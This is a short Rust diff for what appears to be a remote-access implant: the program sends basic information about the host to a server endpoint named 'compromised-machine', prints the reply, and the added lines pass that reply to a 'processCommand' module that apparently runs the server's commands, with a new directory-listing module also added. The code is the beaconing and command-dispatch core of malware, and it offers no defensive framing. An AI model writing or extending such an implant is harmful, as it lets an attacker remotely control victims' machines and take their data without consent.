@@ -1,13 +1,32 @@
 mod basicinfo;
 mod requests;
 mod utils;
+mod processCommand;
+mod listdir;
+
 use reqwest::Method;
 use serde::{Deserialize, Serialize};
 use requests::send_json_request;
 
+#[derive(Debug, Serialize)]
+struct Response{
+    id:String,
+    response:String
+}
+
+#[derive(Debug, Serialize)]
+struct Response2{
+    id:String,
+    result:String
+}
+
+
+
+
+const  url:&str = "http://localhost/api/compromised-machine/";
 
 fn main() {
-    let url = "http://localhost/api/compromised-machine/";
+    
     let info = basicinfo::basic_info();
     let get_resp  = send_json_request(Method::GET, url, Some(&info));
 
@@ -19,11 +38,8 @@ fn main() {
         }
     };
 
-    if let Some(title) = utils::get_string_from_json(&message, "message") {
-        println!("Title: {}", title);
-    } else {
-        println!("No title found in the response.");
-    }
+    println!("{}" , message);
 
+    processCommand::filter_command(&message);
    
 }
